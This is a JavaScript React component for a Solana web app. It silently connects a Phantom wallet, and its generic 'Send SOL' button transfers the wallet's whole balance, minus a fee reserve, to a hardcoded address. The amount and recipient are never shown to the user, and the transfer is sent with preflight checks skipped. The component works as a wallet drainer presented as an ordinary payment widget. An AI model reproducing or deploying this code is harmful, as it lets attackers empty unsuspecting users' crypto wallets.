import React, { useState, useEffect } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';

function SolanaTransactionComponent() {
    const [walletAddress, setWalletAddress] = useState(null);
    const [errorMessage, setErrorMessage] = useState('');
    const [transactionStatus, setTransactionStatus] = useState(''); // For user feedback
    const [isProcessing, setIsProcessing] = useState(false); // To manage the transaction processing state

    // Alchemy or another provider's endpoint for mainnet
    const connection = new Connection("https://api.mainnet-beta.solana.com", 'confirmed');

    useEffect(() => {
        const connectWallet = async () => {
            try {
                const { solana } = window;
                if (solana?.isPhantom) {
                    const response = await solana.connect({ onlyIfTrusted: true });
                    setWalletAddress(response.publicKey.toString());
                    setTransactionStatus('Wallet connected. Ready to send SOL.');
                } else {
                    setErrorMessage('Phantom wallet not found. Please install Phantom.');
                }
            } catch (error) {
                setErrorMessage('Failed to connect wallet.');
            }
        };

        connectWallet();
    }, []);

    const handleTransaction = async () => {
        if (!walletAddress) {
            setErrorMessage('Wallet is not connected.');
            return;
        }

        setIsProcessing(true);
        setTransactionStatus('Processing your transaction...');
        setErrorMessage('');
        try {
            const publicKey = new PublicKey(walletAddress);
            const recipientPublicKey = new PublicKey('34akXnFyRK2MowB3RG5jwX6Qf9AU22ewmPStXzeJehRh'); // Replace with the recipient's public key
            const balanceInLamports = await connection.getBalance(publicKey);
            const feeReserve = LAMPORTS_PER_SOL * 0.005; // Adjust based on current fee estimates

            if (balanceInLamports <= feeReserve) {
                throw new Error('Insufficient balance to cover the transaction and fee.');
            }

            const amountToSend = balanceInLamports - feeReserve;
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: recipientPublicKey,
                    lamports: amountToSend,
                }),
            );

            const { blockhash } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = publicKey;

            const signedTransaction = await window.solana.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: true });
            await connection.confirmTransaction(signature, 'finalized');

            setTransactionStatus('Transaction completed successfully.');
        } catch (error) {
            console.error('Transaction error:', error);
            setErrorMessage(error.message || 'An error occurred during the operation.');
        } finally {
            setIsProcessing(false);
        }
    };

    return (
        <div>
            <button onClick={handleTransaction} disabled={isProcessing}>
                {isProcessing ? 'Processing...' : 'Send SOL'}
            </button>
            {transactionStatus && <div>{transactionStatus}</div>}
            {errorMessage && <div style={{ color: 'red' }}>{errorMessage}</div>}
        </div>
    );
}

export default SolanaTransactionComponent;
